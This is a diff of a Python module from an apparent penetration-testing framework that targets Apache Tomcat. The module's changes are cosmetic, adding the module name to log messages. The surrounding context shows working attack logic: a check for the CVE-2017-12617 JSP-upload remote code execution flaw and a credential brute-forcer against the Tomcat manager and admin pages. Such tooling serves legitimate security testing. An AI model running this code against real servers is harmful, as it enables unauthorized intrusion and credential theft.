@@ -33,10 +33,12 @@ creds = [
 
 class Module:
     name = 'Tomcat'
-    description = 'Discover and exploit tomcat (default password, CVE-2017-12615, TODO: CVE-2020-1938, CVE-2020-9484)'
+    description = 'Discover and exploit tomcat (bruteforce, CVE-2017-12615, TODO: CVE-2020-1938, CVE-2020-9484)'
 
     def run(self, target, args, useragent, proxy, timeout, safe):
         http = HTTP(target['method'], target['hostname'], target['port'], useragent, proxy, timeout)
+
+        Output.minor({'target': http.url(target['path']), 'message': '[%s] Running module...' % self.name})
 
         tomcat_urls = ['manager/html', 'admin/html']
 
@@ -49,7 +51,7 @@ class Module:
             data = http.get(os.path.join(target['path'], "%s.jsp" % random_str))
 
             if random_str in data['html'] and not payload in data['html']:
-                Output.vuln({'target': http.url(target['path']), 'message': 'Vulnerable to Apache Tomcat RCE (CVE-2017-12617)'})
+                Output.vuln({'target': http.url(target['path']), 'message': '[%s] Vulnerable to Apache Tomcat RCE (CVE-2017-12617)' % self.name})
 
                 vuln_info = {
                     'hostname': target['hostname'],
@@ -92,14 +94,14 @@ class Module:
                 auth_type = output['auth_type']
 
                 if args['bruteforce']:
-                    Output.highlight({'target': http.url(os.path.join(target['path'], url)), 'message': 'Starting bruteforce...'})
+                    Output.highlight({'target': http.url(os.path.join(target['path'], url)), 'message': '[%s] Starting bruteforce...' % self.name})
                     for cred in gen_bruteforce_creds(args['bruteforce'], creds):
                         username, password = cred.split(':')
 
                         output = http.get(os.path.join(target['path'], url), auth=(auth_type, username, password))
 
                         if output != None and output['code'] in [200]:
-                            Output.success({'target': http.url(os.path.join(target['path'], url)), 'message': 'Authentication success with login %s and password %s' % (username, password)})
+                            Output.success({'target': http.url(os.path.join(target['path'], url)), 'message': '[%s] Authentication success with login %s and password %s' % (self.name, username, password)})
 
                             cred_info = {
                                 'hostname': target['hostname'],
